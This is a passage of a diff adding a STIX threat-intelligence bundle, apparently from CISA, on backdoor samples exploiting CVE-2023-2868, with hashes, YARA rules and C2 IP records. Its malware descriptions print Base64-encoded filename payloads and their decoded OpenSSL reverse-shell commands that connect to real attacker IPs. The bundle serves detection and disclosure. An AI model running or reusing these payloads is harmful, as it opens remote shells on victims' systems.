+                "SHA-512": "1c22a05e50aa3d954c2d5a1629e192a915c9d576cd1d7cd9ac3a3bbb35d934f6fc1768d996653a0bca2950185c2a9cec3d1675ca29a19b69da26100990eaa0d8",
+                "SSDEEP": "3:TTGRH+YHMFck:TKYYHIck"
+            },
+            "size": 29,
+            "name": "abcdefgc2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCAL3RtcC9wIDIL2Rldi9udWxsO3JtIC90bXAvcCIeebaGs22ech22o_abcdefgeese64_-dGhwh66489.txt",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--cf85c1fe-2a5d-4936-96db-2bc8bed466da",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "abcdefgc2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCAL3RtcC9wIDIL2Rldi9udWxsO3JtIC90bXAvcCIeebaGs22ech22o_abcdefgeese64_-dGhwh66489.txt",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact is dropped by two different .tar files and contains a payload inside its filename that exploits CVE-2023-2868. The exploit payload is a shell script code with an embedded Base64 encoded reverse shell. Upon execution the malware Base64 decodes and executes the reverse shell code. The reverse shells establish connections using the \"OpenSSL\" to the C2 IP address \"107.148.223.196\" and ports \u201c8080\u201d or \"443.\" The standard input and output are redirected to the named pipe \"/tmp/p\" and then removes \"tmp/p\" after the connection is closed.\r\n\r\nThe contents within the two dropped files are the same and is a string \"oGh7ohc4Akeo8ahXeequei7A09302.\" This accounts for the two samples having the same hash, however, payload contents are different within the names of these files. When the payload executes, the commands slightly differ in the use of the port number as seen below.\r\n\r\nWhen the \"snapshot.tar\" file is decompressed the below payload is revealed.\r\n--Begin Payload--\r\n'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCA+L3RtcC9wIDI+L2Rldi9udWxsO3JtIC90bXAvcCI=;ee=ba;G=s;\"ech\"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'\r\n--End Payload--\r\n\r\n--Begin Decoded Payload--\r\nsetsid sh -c \"mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect 107.148.223.196:8080 >/tmp/p 2>/dev/null;rm /tmp/p\"\r\n--End Decoded Payload--\r\n\r\n\r\nWhen the \"snapshot0.tar\" file is decompressed the below payload is revealed.\r\n--Begin Payload--\r\n'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6NDQzID4vdG1wL3AgMj4vZGV2L251bGw7cm0gL3RtcC9wIg==;ee=ba;G=s;\"ech\"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'\r\n--End Payload--\r\n\r\n--Begin Decoded Payload--\r\nsetsid sh -c \"mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect 107.148.223.196:443 >/tmp/p 2>/dev/null;rm /tmp/p\"\r\n--End Decoded Payload--",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10452108_03 rule_content=rule CISA_10452108_03 : backdoor communicates_with_c2 installs_other_components\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10452108\"\n\t\tDate = \"2023-06-20\"\n\t\tLast_Modified = \"\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"n/a\"\n\t\tCapabilities = \"communicates-with-c2 installs-other-components\"\n\t\tMalware_Type = \"backdoor\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects malicious Linux reverse shell samples\"\n\t\tSHA256_1 = \"2a5de691243f2b91f164c3021c157fbd783b4f3e7d5f5950182e52ec868cd40b\"\n\tstrings:\n\t\t$s0 = { 6f 47 68 37 6f 68 63 34 }\n\t\t$s1 = { 41 6b 65 6f 38 61 68 58 }\n\t\t$s2 = { 65 65 71 75 65 69 37 41 30 39 33 30 32 }\n\tcondition:\n\t\tall of them\n}\n 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_09 rule_content=rule CISA_10454006_09 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-05\"\n\t\tLast_Modified = \"20230712_1400\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"n/a\"\n\t\tCapabilities = \"accesses-remote-machines communicates-with-c2\"\n\t\tMalware_Type = \"trojan backdoor remote-access-trojan\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868\"\n\t\tSHA256_1 = \"949d4b01f31256e5e9c2b04e557dcca0a25fc2f6aa3618936befc7525e1df788\"\n\t\tSHA256_2 = \"f289b565839794fe4f450ed0c9343b8fb699f97544d9af2a60851abc8b4656e0\"\n\t\tSHA256_3 = \"2a5de691243f2b91f164c3021c157fbd783b4f3e7d5f5950182e52ec868cd40b\"\n\tstrings:\n\t\t$s1 = { 61 62 63 64 65 66 67 }\n\t\t$s2 = { 63 32 56 30 63 32 6c 6b 49 48 4e 6f 49 43 31 6a }\n\t\t$s3 = { 49 44 49 2b 4c 32 52 6c 64 69 39 75 64 57 78 73 }\n\t\t$s4 = { 49 43 39 30 62 58 41 76 }\n\t\t$s5 = { 59 32 39 75 62 6d 56 6a 64 }\n\t\t$n1 = { 6f 47 68 37 6f 68 63 34 }\n\t\t$n2 = { 41 6b 65 6f 38 61 68 58 }\n\t\t$n3 = { 65 65 71 75 65 69 37 41 30 39 33 30 32 }\n\tcondition:\n\t\tall of ($s*) or all of ($n*)\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:53.568718Z"
+        },
+        {
+            "type": "malware-analysis",
+            "spec_version": "2.1",
+            "id": "malware-analysis--fa7a9c7f-9761-4386-8166-54140c484bb8",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "product": "ahnlab",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "result_name": "Exploit/Bin.CVE-2023-2868",
+            "result": "unknown",
+            "sample_ref": "file--1d637deb-c006-5ce3-a7e2-2061ea0c9ae0"
+        },
+        {
+            "type": "malware",
+            "spec_version": "2.1",
+            "id": "malware--7e974291-f9c7-4bb8-b7dd-61d76baee766",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact is dropped by two different .tar files and contains a payload inside its filename that exploits CVE-2023-2868. The exploit payload is a shell script code with an embedded Base64 encoded reverse shell. Upon execution the malware Base64 decodes and executes the reverse shell code. The reverse shells establish connections using the \"OpenSSL\" to the C2 IP address \"107.148.223.196\" and ports \u201c8080\u201d or \"443.\" The standard input and output are redirected to the named pipe \"/tmp/p\" and then removes \"tmp/p\" after the connection is closed.\r\n\r\nThe contents within the two dropped files are the same and is a string \"oGh7ohc4Akeo8ahXeequei7A09302.\" This accounts for the two samples having the same hash, however, payload contents are different within the names of these files. When the payload executes, the commands slightly differ in the use of the port number as seen below.\r\n\r\nWhen the \"snapshot.tar\" file is decompressed the below payload is revealed.\r\n--Begin Payload--\r\n'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCA+L3RtcC9wIDI+L2Rldi9udWxsO3JtIC90bXAvcCI=;ee=ba;G=s;\"ech\"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'\r\n--End Payload--\r\n\r\n--Begin Decoded Payload--\r\nsetsid sh -c \"mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect 107.148.223.196:8080 >/tmp/p 2>/dev/null;rm /tmp/p\"\r\n--End Decoded Payload--\r\n\r\n\r\nWhen the \"snapshot0.tar\" file is decompressed the below payload is revealed.\r\n--Begin Payload--\r\n'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6NDQzID4vdG1wL3AgMj4vZGV2L251bGw7cm0gL3RtcC9wIg==;ee=ba;G=s;\"ech\"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'\r\n--End Payload--\r\n\r\n--Begin Decoded Payload--\r\nsetsid sh -c \"mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect 107.148.223.196:443 >/tmp/p 2>/dev/null;rm /tmp/p\"\r\n--End Decoded Payload--",
+            "malware_types": [
+                "backdoor",
+                "trojan"
+            ],
+            "is_family": false,
+            "sample_refs": [
+                "file--1d637deb-c006-5ce3-a7e2-2061ea0c9ae0"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--eb3e117e-3532-47d9-b52b-efdc740510d6",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "abcdefgc2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCAL3RtcC9wIDIL2Rldi9udWxsO3JtIC90bXAvcCIeebaGs22ech22o_abcdefgeese64_-dGhwh66489.txt",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": "[file:hashes.'MD5'='fe1e2d676c91f899b706682b70176983' OR file:hashes.'SHA-1'='77b1864c489affe0ac2284135050373951b7987e' OR file:hashes.'SHA-256'='2a5de691243f2b91f164c3021c157fbd783b4f3e7d5f5950182e52ec868cd40b' OR file:hashes.'SHA-512'='1c22a05e50aa3d954c2d5a1629e192a915c9d576cd1d7cd9ac3a3bbb35d934f6fc1768d996653a0bca2950185c2a9cec3d1675ca29a19b69da26100990eaa0d8']",
+            "pattern_type": "stix",
+            "pattern_version": "2.1",
+            "valid_from": "2023-07-27T20:32:53.571672Z"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--372b2070-7907-5089-be84-ae08ac278b95",
+            "value": "107.148.223.196",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--4e24307c-6afd-407e-8d28-7a7eead31b8b",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "107.148.223.196",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This IP address is used as C2 by the samples exploiting CVE-2023-2868.",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": "[ipv4-addr:value = '107.148.223.196']",
+            "pattern_type": "stix",
+            "pattern_version": "2.1",
+            "valid_from": "2023-07-27T20:32:53.583663Z"
+        },
+        {
+            "type": "location",
+            "spec_version": "2.1",
+            "id": "location--0a8b3d79-0969-40be-8f72-bd1047fbabbe",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-07-27T20:32:53.659925Z",
+            "modified": "2023-07-27T20:32:53.659925Z",
+            "name": "107.148.223.196",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "NetRange:       107.148.0.0 - 107.149.255.255\r\nCIDR:           107.148.0.0/15\r\nNetName:        PT-82-10\r\nNetHandle:      NET-107-148-0-0-1\r\nParent:         NET107 (NET-107-0-0-0-0)\r\nNetType:        Direct Allocation\r\nOriginAS:       AS398478, AS398993, AS399195, AS54600, AS398823\r\nOrganization:   PEG TECH INC (PT-82)\r\nRegDate:        2013-11-08\r\nUpdated:        2021-01-06\r\nRef:            https://rdap.arin.net/registry/ip/107.148.0.0\r\n\r\nOrgName:        PEG TECH INC\r\nOrgId:          PT-82\r\nAddress:        55 South Market Street, Suite 320\r\nCity:           San Jose\r\nStateProv:      CA\r\nPostalCode:     95113\r\nCountry:        US\r\nRegDate:        2012-03-27\r\nUpdated:        2017-01-28\r\nRef:            https://rdap.arin.net/registry/entity/PT-82\r\n\r\nOrgNOCHandle: NOC12550-ARIN\r\nOrgNOCName:   NOC\r\nOrgNOCPhone:  +1-657-206-5036 \r\nOrgNOCEmail:  \r\nOrgNOCRef:    https://rdap.arin.net/registry/entity/NOC12550-ARIN\r\n\r\nOrgAbuseHandle: ABUSE3497-ARIN\r\nOrgAbuseName:   Abuse\r\nOrgAbusePhone:  +1-657-206-5036 \r\nOrgAbuseEmail:  \r\nOrgAbuseRef:    https://rdap.arin.net/registry/entity/ABUSE3497-ARIN\r\n\r\nOrgTechHandle: NOC12550-ARIN\r\nOrgTechName:   NOC\r\nOrgTechPhone:  +1-657-206-5036 \r\nOrgTechEmail:  \r\nOrgTechRef:    https://rdap.arin.net/registry/entity/NOC12550-ARIN",
+            "region": "northern-america",
+            "country": "US",
+            "city": "San Jose",
+            "street_address": "55 South Market Street, Suite 320",
+            "postal_code": "95113"
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--24f6c2d4-34d3-50af-9405-cdd5a5971853",
+            "hashes": {
+                "MD5": "212031b3a6e958fb7b545862407e5f7a",
+                "SHA-1": "693247647b55476a383579f07e7e1eb16fc86b70",
+                "SHA-256": "2b2b7c5e825b7a18e13319b4a1275a0dd0086abd58b2d45939269d5a613a41e7",
+                "SHA-512": "88453bf84dfcbf7b162a414e06d2c1038924844aebf6cac847130ccb1aa32debaaebee13ce58ffa2277e1aeadc101b8a7f4ac53b2caa7405467846c783be5f9a",
+                "SSDEEP": "6:a5YA5VJ94nqrz8r+pssRHUuHQjgxlopNO1oCb+LlvN7kqS200orzFn:a5YSVMn0k+phRPHQjgxl0Fk7PzF"
+            },
+            "size": 245,
+            "name": "abcdefgc2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIxOS41NDo0NDMgPi90bXAvcCAyPi9kZXYvbnVsbDtybSAvdG1wL3Ai_eebaGsecho_abcdefgeese64_dGhwh66489.txt",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "malware",
+            "spec_version": "2.1",
+            "id": "malware--c0193129-a26c-4fd6-a23f-12482028f45f",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "description": "This artifact contains a payload that exploits CVE-2023-2868. The exploit payload is a shell script code with an embedded Base64 encoded reverse shell. Upon execution the malware base64 decodes and executes the reverse shell code. The reverse shell establishes connections using the \"OpenSSL\" to the C2 IP address \"107.148.219.54\" and port \u201c443\u201d and redirects the standard input and output to the named pipe \"/tmp/p\" and then removes \"/tmp/p\" after the connection is closed.\r\n\r\n--Begin Encoded Payload--\r\n'`abcdefg\\=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIxOS41NDo0NDMgPi90bXAvcCAyPi9kZXYvbnVsbDtybSAvdG1wL3Ai;ee\\=ba;G\\=s;\"ech\"o $abcdefg;${ee}se64 -d;${G}h;wh66489.txt`' \r\n--End Encoded Payload--\r\n\r\n--Begin Decoded Payload--\r\nsetsid sh -c \"mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect 107.148.219.54:443 >/tmp/p 2>/dev/null;rm /tmp/p\"\r\n--End Decoded Payload--",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "malware_types": [
+                "backdoor",
+                "trojan"
+            ],
+            "is_family": false,
+            "sample_refs": [
+                "file--24f6c2d4-34d3-50af-9405-cdd5a5971853"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--fcb10f9a-9a90-45e0-bf2f-663d762e1a7a",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "abcdefgc2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIxOS41NDo0NDMgPi90bXAvcCAyPi9kZXYvbnVsbDtybSAvdG1wL3Ai_eebaGsecho_abcdefgeese64_dGhwh66489.txt",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": "[file:hashes.'MD5'='212031b3a6e958fb7b545862407e5f7a' OR file:hashes.'SHA-1'='693247647b55476a383579f07e7e1eb16fc86b70' OR file:hashes.'SHA-256'='2b2b7c5e825b7a18e13319b4a1275a0dd0086abd58b2d45939269d5a613a41e7' OR file:hashes.'SHA-512'='88453bf84dfcbf7b162a414e06d2c1038924844aebf6cac847130ccb1aa32debaaebee13ce58ffa2277e1aeadc101b8a7f4ac53b2caa7405467846c783be5f9a']",
+            "pattern_type": "stix",
+            "pattern_version": "2.1",
+            "valid_from": "2023-07-27T20:32:53.682814Z"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--9e996167-beef-5f00-893f-e80702d9e5cb",
+            "value": "107.148.219.54",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--6602929a-cd78-481f-aebd-00052fd3d2f4",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "107.148.219.54",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This IP address is used as C2 by the samples exploiting CVE-2023-2868.",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": "[ipv4-addr:value = '107.148.219.54']",
+            "pattern_type": "stix",
+            "pattern_version": "2.1",
+            "valid_from": "2023-07-27T20:32:53.693645Z"
+        },
+        {
+            "type": "location",
+            "spec_version": "2.1",
+            "id": "location--44394b45-dea1-4dc3-ab09-899035ff2e5b",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-07-27T20:32:53.700513Z",
+            "modified": "2023-07-27T20:32:53.700513Z",
+            "name": "107.148.219.54",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "NetRange:       107.148.0.0 - 107.149.255.255\r\nCIDR:           107.148.0.0/15\r\nNetName:        PT-82-10\r\nNetHandle:      NET-107-148-0-0-1\r\nParent:         NET107 (NET-107-0-0-0-0)\r\nNetType:        Direct Allocation\r\nOriginAS:       AS398478, AS398993, AS399195, AS54600, AS398823\r\nOrganization:   PEG TECH INC (PT-82)\r\nRegDate:        2013-11-08\r\nUpdated:        2021-01-06\r\nRef:            https://rdap.arin.net/registry/ip/107.148.0.0\r\n\r\nOrgName:        PEG TECH INC\r\nOrgId:          PT-82\r\nAddress:        55 South Market Street, Suite 320\r\nCity:           San Jose\r\nStateProv:      CA\r\nPostalCode:     95113\r\nCountry:        US\r\nRegDate:        2012-03-27\r\nUpdated:        2017-01-28\r\nRef:            https://rdap.arin.net/registry/entity/PT-82\r\n\r\nOrgAbuseHandle: ABUSE3497-ARIN\r\nOrgAbuseName:   Abuse\r\nOrgAbusePhone:  +1-657-206-5036 \r\nOrgAbuseEmail:  \r\nOrgAbuseRef:    https://rdap.arin.net/registry/entity/ABUSE3497-ARIN\r\n\r\nOrgTechHandle: NOC12550-ARIN\r\nOrgTechName:   NOC\r\nOrgTechPhone:  +1-657-206-5036 \r\nOrgTechEmail:  \r\nOrgTechRef:    https://rdap.arin.net/registry/entity/NOC12550-ARIN\r\n\r\nOrgNOCHandle: NOC12550-ARIN\r\nOrgNOCName:   NOC\r\nOrgNOCPhone:  +1-657-206-5036 \r\nOrgNOCEmail:  \r\nOrgNOCRef:    https://rdap.arin.net/registry/entity/NOC12550-ARIN",
+            "region": "northern-america",
+            "country": "US",
+            "city": "San Jose",
+            "street_address": "55 South Market Street, Suite 320",
+            "postal_code": "95113"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--59008269-2208-46ce-9d30-52170f3cdb4a",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "relationship_type": "communicates-with",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "malware--0592ee79-5a16-42a2-a2bb-1d58124d3e1b",
+            "target_ref": "ipv4-addr--372b2070-7907-5089-be84-ae08ac278b95"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--c53e099e-f72f-4918-acb1-91bf46ce172b",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "relationship_type": "communicates-with",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "malware--5c41a2ad-4831-465f-9767-a455217efa4a",
+            "target_ref": "ipv4-addr--372b2070-7907-5089-be84-ae08ac278b95"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1ed2cf98-cc33-469c-8244-d708980eb00d",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "relationship_type": "communicates-with",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "malware--ed86b905-12fd-45e3-9029-9eb0c0a219bd",
+            "target_ref": "ipv4-addr--372b2070-7907-5089-be84-ae08ac278b95"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--de14fe88-1a8a-423b-85bd-f0f28df3a749",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "relationship_type": "communicates-with",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "malware--4a271788-6138-4f9b-a67a-cb5ce3c1dca5",
+            "target_ref": "ipv4-addr--372b2070-7907-5089-be84-ae08ac278b95"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--9cf37716-6211-4b76-af51-3a5fabd17c25",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "relationship_type": "communicates-with",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "malware--8bf737e1-6a3c-4513-a3f8-edadcc0e557b",
+            "target_ref": "ipv4-addr--372b2070-7907-5089-be84-ae08ac278b95"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--11b52a6a-073d-424a-8e19-baffe798c145",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "relationship_type": "communicates-with",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "malware--f6c8112c-3600-4258-8a16-bbfdf47d1e55",
+            "target_ref": "ipv4-addr--372b2070-7907-5089-be84-ae08ac278b95"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e5504033-ce7d-4c08-aab2-6a6b5e160d03",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "relationship_type": "communicates-with",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "malware--9c177434-9d70-4b8d-991d-4be51e5d0b6f",
+            "target_ref": "ipv4-addr--372b2070-7907-5089-be84-ae08ac278b95"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--83114550-a064-4e0e-990f-eb1132d43156",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "relationship_type": "communicates-with",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "malware--8e37f58a-8c50-46e8-9373-0539bf3e1e8b",
+            "target_ref": "ipv4-addr--372b2070-7907-5089-be84-ae08ac278b95"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--3f44bd08-df5a-4871-80c2-e7e281b6f44b",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "relationship_type": "communicates-with",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "malware--45416c0c-ee72-4852-9b2b-2ba40e273144",
+            "target_ref": "ipv4-addr--372b2070-7907-5089-be84-ae08ac278b95"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--70a736c1-d93f-405d-ae24-d6854221e891",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "relationship_type": "communicates-with",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "malware--c2243878-a430-41e6-bed2-4e6c4db6cac3",
+            "target_ref": "ipv4-addr--372b2070-7907-5089-be84-ae08ac278b95"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8c84b21b-9bfb-4bd6-9d74-ed4b5bffd938",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "relationship_type": "drops",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "malware--52699c03-0ebf-4fb8-bbb5-0ca4e6dc46ec",
+            "target_ref": "malware--7e974291-f9c7-4bb8-b7dd-61d76baee766"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
